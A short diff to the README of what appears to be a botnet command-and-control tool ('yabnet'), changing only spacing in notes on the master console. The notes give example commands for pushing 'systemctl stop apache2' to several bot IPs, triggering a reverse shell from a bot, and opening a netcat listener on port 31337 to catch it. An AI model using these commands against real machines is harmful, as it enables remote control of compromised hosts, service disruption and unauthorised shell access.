@@ -118,10 +118,16 @@ The master console has various commands that can be used for controlling the bot
 
 **Notes** 
 1. Specifying multiple targets with `,` comma separator is possible. 
+
 `ex) push -t 10.0.1.1,10.0.2.1,10.0.3.1 -c "systemctl stop apache2"`
+
+
 2. Reverse shell command requires the master to open a new console and setup a netcat listener. 
+
 `ex) reverse -t 10.0.3.4 -p 31337` 
+
 `ex) nc -lvnp 31337         // And then for the reverse shell from 10.0.3.4` 
+
 3. The server is hosting files in `/opt/yabnet/server/uploads/` directory. 
 
 ## Demo
